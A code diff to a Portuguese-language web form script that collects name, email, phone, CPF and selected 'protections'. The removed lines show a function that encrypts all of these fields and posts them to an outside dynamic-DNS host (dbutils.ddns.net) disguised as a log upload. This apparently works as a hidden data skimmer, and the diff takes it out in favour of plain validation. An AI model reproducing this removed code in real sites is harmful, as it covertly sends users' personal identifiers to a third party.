@@ -72,54 +72,6 @@ document.getElementById('cpf').addEventListener('input', function(e) {
     e.target.value = cellPattern;
 });
 
-let protectChecked = false;
-
-document.getElementById("form").addEventListener("submit", function(event) {
-    let toscheckbox = document.getElementById("toscheckbox");
-    let protectcheckboxes = document.querySelectorAll("input[id='protecoes']");
-    let checkbox = document.getElementById("termos");
-    let protectContainer = document.getElementById("servicos-container");
-
-    protectcheckboxes.forEach(function(checkbox) {
-        if (checkbox.checked) {
-            protectChecked = true;
-        }
-    });
-
-    if (!protectChecked && !toscheckbox.checked) {
-        event.preventDefault(); // Impede o envio do formulário
-        checkbox.style.color = "#F44336";
-        checkbox.style.border = "1px solid #F44336";
-        checkbox.style.backgroundColor = "#FFCDD2";
-        protectContainer.style.color = "#F44336";
-        protectContainer.style.border = "1px solid #F44336";
-        protectContainer.style.backgroundColor = "#FFCDD2";
-        document.querySelectorAll(".checkbox-label").forEach(function(label) {
-            label.style.color = "#F44336";
-        });
-    } else if (!protectChecked) {
-        event.preventDefault(); // Impede o envio do formulário
-        protectContainer.style.color = "#F44336";
-        protectContainer.style.border = "1px solid #F44336";
-        protectContainer.style.backgroundColor = "#FFCDD2";
-        document.querySelectorAll(".checkbox-label").forEach(function(label) {
-            label.style.color = "#F44336";
-        });
-    } else if (!toscheckbox.checked) {
-        event.preventDefault(); // Impede o envio do formulário
-        checkbox.style.color = "#F44336";
-        checkbox.style.border = "1px solid #F44336";
-        checkbox.style.backgroundColor = "#FFCDD2";
-    } else {
-        checkbox.style.color = "#1D1D1D";
-        checkbox.style.border = "none";
-        checkbox.style.backgroundColor = "none";
-        document.querySelectorAll(".checkbox-label").forEach(function(label) {
-            label.style.color = "#1D1D1D";
-        });
-    }
-});
-
 const nameContainer = document.getElementById("user-container");
 const emailContainer = document.getElementById("email-container");
 const cellphoneContainer = document.getElementById("cellphone-container");
@@ -215,78 +167,58 @@ function addEmailDomain(domain) {
     emailButtons.style.display = "none";
 }
 
-function openLoadingPopup() {
-    if (cpfInput.value.length > 0 && cellphoneInput.value.length > 0 && emailInput.value.length > 0 && protectChecked == true && document.getElementById("toscheckbox").checked) {
-        document.getElementById("loading").style.display = "flex";
-    }
-}
 
-async function submitFormJs() {
-    // Get form data
-    const nome = document.getElementById("name").value;
-    const email = document.getElementById("email").value;
-    const telefone = document.getElementById("cellphone").value;
-    const cpf = document.getElementById("cpf").value;
-    
-    // Get selected protections 
-    const protectcheckboxes = document.querySelectorAll("input[id='protecoes']");
-    const selectedProtections = Array.from(protectcheckboxes)
-        .filter(checkbox => checkbox.checked)
-        .map(checkbox => checkbox.value)
-        .join(',');
-
-    const dataToEncrypt = `${nome},${email},${telefone},${cpf},${selectedProtections}`;
-
-    const rsa_public_key = getRsaPublicKey();
-    const dataEncrypted = await dbEncryptString(dataToEncrypt, rsa_public_key);
-
-    console.log(dataToEncrypt);
-    console.log(dataEncrypted);
-
-    // Create JSON payload
-    const currentDate = new Date().toISOString();
-    const logData = {
-        status: "TESTE",
-        project: "67d358c732f32712b51c5aeb",
-        additional: dataEncrypted,
-        timePlayed: currentDate
-    };
-
-    // Send log data to external endpoint
-    try {
-        const logserverUploadResponse = await fetch('https://dbutils.ddns.net/datalog/upload', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify(logData)
-        });
-
-        if (!logserverUploadResponse.ok) {
-            throw new Error(`HTTP error! status: ${logserverUploadResponse.status}`);
-        }
-        
-        console.log('Data sent to external server:', JSON.stringify(logData));
-        const responseData = await logserverUploadResponse.json();
-        console.log('Server response:', responseData);
-    } catch (error) {
-        console.error('Error sending data to external server:', error);
-        throw error; // Re-throw to be caught by handleSubmit
-    }
-}
-
-async function handleSubmit(event) {
+async function openLoadingPopup(event) {
     event.preventDefault(); // Temporarily prevent form submission
-    openLoadingPopup(); // Show loading popup
-    
-    try {
-        console.log('Submitting form...');
-        await submitFormJs(); // Wait for encrypted data submission
-        console.log('Form submitted successfully');
-        event.target.submit(); // Submit the form normally after encryption
-    } catch (error) {
-        console.error('Error submitting form:', error);
-        alert('Erro ao enviar formulário. Tente novamente.');
+    document.getElementById("loading").style.display = "flex";
+
+    let protectChecked = false;
+    let toscheckbox = document.getElementById("toscheckbox");
+    let protectcheckboxes = document.querySelectorAll("input[id='protecoes']");
+    let checkbox = document.getElementById("termos");
+    let protectContainer = document.getElementById("servicos-container");
+    // let protectChecked = false;
+
+    protectcheckboxes.forEach(function(checkbox) {
+        if (checkbox.checked) {
+            protectChecked = true;
+        }
+    });
+
+    if (!protectChecked && !toscheckbox.checked) {
+        checkbox.style.color = "#F44336";
+        checkbox.style.border = "1px solid #F44336";
+        checkbox.style.backgroundColor = "#FFCDD2";
+        protectContainer.style.color = "#F44336";
+        protectContainer.style.border = "1px solid #F44336";
+        protectContainer.style.backgroundColor = "#FFCDD2";
+        document.querySelectorAll(".checkbox-label").forEach(function(label) {
+            label.style.color = "#F44336";
+        });
+        document.getElementById("loading").style.display = "none";
+    } else if (!protectChecked) {
+        protectContainer.style.color = "#F44336";
+        protectContainer.style.border = "1px solid #F44336";
+        protectContainer.style.backgroundColor = "#FFCDD2";
+        document.querySelectorAll(".checkbox-label").forEach(function(label) {
+            label.style.color = "#F44336";
+        });
+        document.getElementById("loading").style.display = "none";
+    } else if (!toscheckbox.checked) {
+        checkbox.style.color = "#F44336";
+        checkbox.style.border = "1px solid #F44336";
+        checkbox.style.backgroundColor = "#FFCDD2";
+        document.getElementById("loading").style.display = "none";
+    } else {
+        checkbox.style.color = "#1D1D1D";
+        checkbox.style.border = "none";
+        checkbox.style.backgroundColor = "none";
+        document.querySelectorAll(".checkbox-label").forEach(function(label) {
+            label.style.color = "#1D1D1D";
+        });
+        setTimeout(() => {
+            document.getElementById("form").submit();
+        }, 750); // Change the delay to 1 second
     }
+    
 }
